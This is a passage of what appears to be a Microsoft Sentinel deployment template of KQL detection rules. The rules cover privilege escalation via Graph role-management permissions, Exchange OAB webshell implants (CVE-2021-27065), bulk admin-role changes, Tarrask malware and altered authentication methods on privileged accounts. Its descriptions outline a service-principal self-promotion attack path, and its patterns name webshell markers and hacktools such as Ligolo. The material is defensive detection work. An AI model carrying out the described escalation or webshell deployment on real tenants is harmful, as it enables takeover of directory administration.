CreatedByUserPrincipalName, CreatedByAadUserId, CreatedByIPAddress, Creation_AdditionalDetails = AdditionalDetails, Creation_InitiatedBy = InitiatedBy, Creation_TargetResources = TargetResources, Deletion_AdditionalDetails, Deletion_InitiatedBy, Deletion_TargetResources\n| extend TargetName = tostring(split(TargetUserPrincipalName,'@',0)[0]), TargetUPNSuffix = tostring(split(TargetUserPrincipalName,'@',1)[0])\n| extend CreatedByName = tostring(split(CreatedByUserPrincipalName,'@',0)[0]), CreatedByUPNSuffix = tostring(split(CreatedByUserPrincipalName,'@',1)[0])\n| extend DeletedByName = tostring(split(DeletedByUserPrincipalName,'@',0)[0]), DeletedByUPNSuffix = tostring(split(DeletedByUserPrincipalName,'@',1)[0])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "bb616d82-108f-47d3-9dec-9652ea0d3bf6",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "TargetName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "TargetUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "CreatedByUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "CreatedByName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "CreatedByUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "CreatedByAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeletedByUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "DeletedByName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "DeletedByUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "DeletedByAadUserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CreatedByIPAddress"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "DeletedByIPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/1649346e-91c4-4276-8591-999020a69d37')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/1649346e-91c4-4276-8591-999020a69d37')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Admin promotion after Role Management Application Permission Grant",
          "description": "This rule looks for a service principal being granted the Microsoft Graph RoleManagement.ReadWrite.Directory (application) permission before being used to add an Microsoft Entra ID object or user account to an Admin directory role (i.e. Global Administrators).\nThis is a known attack path that is usually abused when a service principal already has the AppRoleAssignment.ReadWrite.All permission granted. This permission allows an app to manage permission grants for application permissions to any API.\nA service principal can promote itself or other service principals to admin roles (i.e. Global Administrators). This would be considered a privilege escalation technique.\nRef : https://docs.microsoft.com/graph/permissions-reference#role-management-permissions, https://docs.microsoft.com/graph/api/directoryrole-post-members?view=graph-rest-1.0&tabs=http",
          "severity": "High",
          "enabled": true,
          "query": "let query_frequency = 1h;\nlet query_period = 2h;\nAuditLogs\n| where TimeGenerated > ago(query_period)\n| where Category =~ \"ApplicationManagement\" and LoggedByService =~ \"Core Directory\"\n| where OperationName =~ \"Add app role assignment to service principal\"\n| mv-expand TargetResource = TargetResources\n| mv-expand modifiedProperty = TargetResource[\"modifiedProperties\"]\n| where tostring(modifiedProperty[\"displayName\"]) == \"AppRole.Value\"\n| extend PermissionGrant = tostring(modifiedProperty[\"newValue\"])\n| where PermissionGrant has \"RoleManagement.ReadWrite.Directory\"\n| mv-apply modifiedProperty = TargetResource[\"modifiedProperties\"] on (\n    summarize modifiedProperties = make_bag(\n        bag_pack(tostring(modifiedProperty[\"displayName\"]),\n            bag_pack(\"oldValue\", trim(@'[\\\"\\s]+', tostring(modifiedProperty[\"oldValue\"])),\n                \"newValue\", trim(@'[\\\"\\s]+', tostring(modifiedProperty[\"newValue\"])))), 100)\n)\n| project\n    PermissionGrant_TimeGenerated = TimeGenerated,\n    PermissionGrant_OperationName = OperationName,\n    PermissionGrant_Result = Result,\n    PermissionGrant,\n    AppDisplayName = tostring(modifiedProperties[\"ServicePrincipal.DisplayName\"][\"newValue\"]),\n    AppServicePrincipalId = tostring(modifiedProperties[\"ServicePrincipal.ObjectID\"][\"newValue\"]),\n    PermissionGrant_InitiatedBy = InitiatedBy,\n    PermissionGrant_TargetResources = TargetResources,\n    PermissionGrant_AdditionalDetails = AdditionalDetails,\n    PermissionGrant_CorrelationId = CorrelationId\n| join kind=inner (\n    AuditLogs\n    | where TimeGenerated > ago(query_frequency)\n    | where Category =~ \"RoleManagement\" and LoggedByService =~ \"Core Directory\" and AADOperationType =~ \"Assign\"\n    | where isnotempty(InitiatedBy[\"app\"])\n    | mv-expand TargetResource = TargetResources\n    | mv-expand modifiedProperty = TargetResource[\"modifiedProperties\"]\n    | where tostring(modifiedProperty[\"displayName\"]) in (\"Role.DisplayName\", \"RoleDefinition.DisplayName\")\n    | extend RoleAssignment = tostring(modifiedProperty[\"newValue\"])\n    | where RoleAssignment contains \"Admin\"\n    | project\n        RoleAssignment_TimeGenerated = TimeGenerated,\n        RoleAssignment_OperationName = OperationName,\n        RoleAssignment_Result = Result,\n        RoleAssignment,\n        TargetType = tostring(TargetResources[0][\"type\"]),\n        Target = iff(isnotempty(TargetResources[0][\"displayName\"]), tostring(TargetResources[0][\"displayName\"]), tolower(TargetResources[0][\"userPrincipalName\"])),\n        TargetId = tostring(TargetResources[0][\"id\"]),\n        RoleAssignment_InitiatedBy = InitiatedBy,\n        RoleAssignment_TargetResources = TargetResources,\n        RoleAssignment_AdditionalDetails = AdditionalDetails,\n        RoleAssignment_CorrelationId = CorrelationId,\n        AppServicePrincipalId = tostring(InitiatedBy[\"app\"][\"servicePrincipalId\"])\n    ) on AppServicePrincipalId\n| where PermissionGrant_TimeGenerated < RoleAssignment_TimeGenerated\n| extend\n    TargetName = tostring(split(Target, \"@\")[0]),\n    TargetUPNSuffix = tostring(split(Target, \"@\")[1])\n| project PermissionGrant_TimeGenerated, PermissionGrant_OperationName, PermissionGrant_Result, PermissionGrant, AppDisplayName, AppServicePrincipalId, PermissionGrant_InitiatedBy, PermissionGrant_TargetResources, PermissionGrant_AdditionalDetails, PermissionGrant_CorrelationId, \nRoleAssignment_TimeGenerated, RoleAssignment_OperationName, RoleAssignment_Result, RoleAssignment, TargetType, Target, TargetName, TargetUPNSuffix, TargetId, RoleAssignment_InitiatedBy, RoleAssignment_TargetResources, RoleAssignment_AdditionalDetails, RoleAssignment_CorrelationId\n| extend PermissionGrant_InitiatingUserPrincipalName = tostring(PermissionGrant_InitiatedBy.user.userPrincipalName)\n| extend PermissionGrant_InitiatingAadUserId = tostring(PermissionGrant_InitiatedBy.user.id)\n| extend PermissionGrant_InitiatingIpAddress = tostring(iff(isnotempty(PermissionGrant_InitiatedBy.user.ipAddress), PermissionGrant_InitiatedBy.user.ipAddress, PermissionGrant_InitiatedBy.app.ipAddress))\n| extend PermissionGrant_InitiatingAccountName = tostring(split(PermissionGrant_InitiatingUserPrincipalName, \"@\")[0]), PermissionGrant_InitiatingAccountUPNSuffix = tostring(split(PermissionGrant_InitiatingUserPrincipalName, \"@\")[1])\n| extend RoleAssignment_InitiatingUserPrincipalName = tostring(RoleAssignment_InitiatedBy.user.userPrincipalName)\n| extend RoleAssignment_InitiatingAadUserId = tostring(RoleAssignment_InitiatedBy.user.id)\n| extend RoleAssignment_InitiatingIpAddress = tostring(iff(isnotempty(RoleAssignment_InitiatedBy.user.ipAddress), RoleAssignment_InitiatedBy.user.ipAddress, RoleAssignment_InitiatedBy.app.ipAddress))\n| extend RoleAssignment_InitiatingAccountName = tostring(split(RoleAssignment_InitiatingUserPrincipalName, \"@\")[0]),  RoleAssignment_InitiatingAccountUPNSuffix = tostring(split(RoleAssignment_InitiatingUserPrincipalName, \"@\")[1])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation",
            "Persistence"
          ],
          "techniques": [
            "T1098",
            "T1078"
          ],
          "subTechniques": [
            "T1098.003",
            "T1078.004"
          ],
          "alertRuleTemplateName": "f80d951a-eddc-4171-b9d0-d616bb83efdc",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AppDisplayName"
                },
                {
                  "identifier": "AadUserId",
                  "columnName": "AppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Target"
                },
                {
                  "identifier": "Name",
                  "columnName": "TargetName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "TargetUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "PermissionGrant_InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "PermissionGrant_InitiatingAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "PermissionGrant_InitiatingAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "PermissionGrant_InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "RoleAssignment_InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "RoleAssignment_InitiatingAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "RoleAssignment_InitiatingAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "RoleAssignment_InitiatingAadUserId"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/6d15aef6-7b17-48aa-b35b-3e3fa1002edc')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/6d15aef6-7b17-48aa-b35b-3e3fa1002edc')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Microsoft Entra ID Role Management Permission Grant",
          "description": "Identifies when the Microsoft Graph RoleManagement.ReadWrite.Directory (Delegated or Application) permission is granted to a service principal.\nThis permission allows an application to read and manage the role-based access control (RBAC) settings for your company's directory.\nAn adversary could use this permission to add an Microsoft Entra ID object to an Admin directory role and escalate privileges.\nRef : https://docs.microsoft.com/graph/permissions-reference#role-management-permissions\nRef : https://docs.microsoft.com/graph/api/directoryrole-post-members?view=graph-rest-1.0&tabs=http",
          "severity": "High",
          "enabled": true,
          "query": "AuditLogs\n| where Category =~ \"ApplicationManagement\" and LoggedByService =~ \"Core Directory\" and OperationName in~ (\"Add delegated permission grant\", \"Add app role assignment to service principal\")\n| mv-apply TargetResource = TargetResources on\n  (\n      where TargetResource.type =~ \"ServicePrincipal\" and array_length(TargetResource.modifiedProperties) > 0 and isnotnull(TargetResource.displayName)\n      | extend props = TargetResource.modifiedProperties\n  )\n| mv-apply Property = props on\n  (\n      where Property.displayName in~ (\"AppRole.Value\",\"DelegatedPermissionGrant.Scope\")\n      | extend DisplayName = tostring(Property.displayName), PermissionGrant = trim('\"',tostring(Property.newValue))\n  )\n| where PermissionGrant has \"RoleManagement.ReadWrite.Directory\"\n| mv-apply Property = props on\n  (\n      where Property.displayName =~ \"ServicePrincipal.DisplayName\"\n      | extend TargetAppDisplayName = trim('\"',tostring(Property.newValue))\n  )\n| mv-apply Property = props on\n  (\n      where Property.displayName =~ \"ServicePrincipal.ObjectID\"\n      | extend TargetAppServicePrincipalId = trim('\"',tostring(Property.newValue))\n  )\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| project TimeGenerated, OperationName, Result, PermissionGrant, TargetAppDisplayName, TargetAppServicePrincipalId, InitiatingAppName, InitiatingAppServicePrincipalId,\nInitiatingUserPrincipalName, InitiatingAadUserId, InitiatingIpAddress, TargetResources, AdditionalDetails, CorrelationId\n| extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n",
          "queryFrequency": "PT2H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "Impact"
          ],
          "techniques": [
            "T1098",
            "T1078"
          ],
          "subTechniques": [
            "T1098.003",
            "T1078.004"
          ],
          "alertRuleTemplateName": "1ff56009-db01-4615-8211-d4fda21da02d",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetAppDisplayName"
                },
                {
                  "identifier": "AadUserId",
                  "columnName": "TargetAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "InitiatingAppName"
                },
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatingAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatingAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/b7333a2b-71ba-45b1-b275-4c39c2e76de7')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/b7333a2b-71ba-45b1-b275-4c39c2e76de7')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Exchange OAB Virtual Directory Attribute Containing Potential Webshell",
          "description": "This query uses Windows Event ID 5136 in order to detect potential webshell deployment by exploitation of CVE-2021-27065.\nThis query looks for changes to the InternalHostName or ExternalHostName properties of Exchange OAB Virtual Directory objects in AD Directory Services where the new objects contain potential webshell objects.",
          "severity": "High",
          "enabled": true,
          "query": "SecurityEvent\n// Look for specific Directory Service Changes and parse data\n| where EventID == 5136\n| extend EventData = parse_xml(EventData).EventData.Data\n| mv-expand bagexpansion = array EventData\n| evaluate bag_unpack(EventData)\n| extend Key = tostring(column_ifexists('@Name', \"\")), Value = column_ifexists('#text', \"\")\n| evaluate pivot(Key, any(Value),TimeGenerated, EventID, Computer, Account, AccountType, EventSourceName, Activity, SubjectAccount)\n// Where changes relate to Exchange OAB\n| extend ObjectClass = column_ifexists(\"ObjectClass\", \"\")\n| where ObjectClass =~ \"msExchOABVirtualDirectory\"\n// Look for InternalHostName or ExternalHostName properties being changed\n| extend AttributeLDAPDisplayName = column_ifexists(\"AttributeLDAPDisplayName\", \"\")\n| where AttributeLDAPDisplayName in~ (\"msExchExternalHostName\", \"msExchInternalHostName\")\n// Look for suspected webshell activity\n| extend AttributeValue = column_ifexists(\"AttributeValue\", \"\")\n| where AttributeValue has \"script\"\n| project-rename LastSeen = TimeGenerated\n| extend ObjectDN = column_ifexists(\"ObjectDN\", \"\")\n| project-reorder LastSeen, Computer, Account, ObjectDN, AttributeLDAPDisplayName, AttributeValue\n| extend timestamp = LastSeen\n| extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(Computer, DomainIndex + 1), Computer)\n| extend AccountName = tostring(split(Account, @'\\')[1]), AccountNTDomain = tostring(split(Account, @'\\')[0])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1190"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "faf1a6ff-53b5-4f92-8c55-4b20e9957594",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Account"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountNTDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/84d06d39-ea60-4924-807e-56fb6027ec1a')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/84d06d39-ea60-4924-807e-56fb6027ec1a')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Bulk Changes to Privileged Account Permissions",
          "description": "Identifies when changes to multiple users permissions are changed at once. Investigate immediately if not a planned change. This setting could enable an attacker access to Azure subscriptions in your environment.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-identity-management",
          "severity": "High",
          "enabled": true,
          "query": "let AdminRecords = AuditLogs\n| where Category =~ \"RoleManagement\"\n| where ActivityDisplayName has_any (\"Add eligible member to role\", \"Add member to role\")\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"User\"\n      | extend TargetUserPrincipalName = tostring(TargetResource.userPrincipalName),\n               props = TargetResource.modifiedProperties\n  )\n| mv-apply Property = props on \n  (\n      where Property.displayName =~ \"Role.DisplayName\"\n      | extend RoleName = trim('\"',tostring(Property.newValue))\n  )\n| where RoleName contains \"Admin\";\nAdminRecords\n| summarize dcount(TargetUserPrincipalName) by bin(TimeGenerated, 1h)\n| where dcount_TargetUserPrincipalName > 9\n| join kind=rightsemi  (\n  AdminRecords\n  | extend TimeWindow = bin(TimeGenerated, 1h)\n) on $left.TimeGenerated == $right.TimeWindow\n| extend InitiatedByUser = iff(isnotempty(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.user.userPrincipalName), \"\")\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend TargetName = tostring(split(TargetUserPrincipalName,'@',0)[0]), TargetUPNSuffix = tostring(split(TargetUserPrincipalName,'@',1)[0])\n| extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n",
          "queryFrequency": "PT2H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "218f60de-c269-457a-b882-9966632b9dc6",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "TargetUser": "TargetUserPrincipalName",
            "InitiatedByUser": "InitiatedByUser"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "InitiatingAppName"
                },
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "TargetName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "TargetUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatingAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatingAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.7"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a21f9a3b-b691-442b-b2eb-62e6655ebbe4')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a21f9a3b-b691-442b-b2eb-62e6655ebbe4')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "AV detections related to Tarrask malware",
          "description": "This query looks for Microsoft Defender AV detections related to Tarrask malware. In Microsoft Sentinel, the SecurityAlerts table includes only the Device Name of the affected device, this query joins the DeviceInfo table to clearly connect other information such as Device group, ip, logged-on users etc. \n This would allow the Microsoft Sentinel analyst to have more context related to the alert, if available.\n Reference: https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/",
          "severity": "High",
          "enabled": true,
          "query": "let Tarrask_threats = dynamic([\"HackTool:Win64/Tarrask!MS\", \"HackTool:Win64/Ligolo!MSR\", \"Behavior:Win32/ScheduledTaskHide.A\", \"Tarrask\"]);\nDeviceInfo\n| extend DeviceName = tolower(DeviceName)\n| join kind=rightouter ( SecurityAlert\n| where ProviderName =~ \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| extend ThreatFamilyName = tostring(parse_json(ExtendedProperties).ThreatFamilyName)\n| where ThreatName in~ (Tarrask_threats) or ThreatFamilyName in~ (Tarrask_threats)\n| extend CompromisedEntity = tolower(CompromisedEntity)\n) on $left.DeviceName == $right.CompromisedEntity\n| summarize by DisplayName, ThreatName, ThreatFamilyName, PublicIP, AlertSeverity, Description, tostring(LoggedOnUsers), DeviceId, TenantId , bin(TimeGenerated, 1d), CompromisedEntity, tostring(LoggedOnUsers), ProductName, Entities\n| extend HostName = tostring(split(CompromisedEntity, \".\")[0]), DomainIndex = toint(indexof(CompromisedEntity, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(CompromisedEntity, DomainIndex + 1), CompromisedEntity)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1053"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "1785d372-b9fe-4283-96a6-3a1d83cabfd1",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "CompromisedEntity"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "PublicIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f572238b-de51-4519-8e7f-2d3a4abe1837')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f572238b-de51-4519-8e7f-2d3a4abe1837')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Authentication Methods Changed for Privileged Account",
          "description": "Identifies authentication methods being changed for a privileged account. This could be an indication of an attacker adding an auth method to the account so they can have continued access.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#things-to-monitor-1",
          "severity": "High",
          "enabled": true,
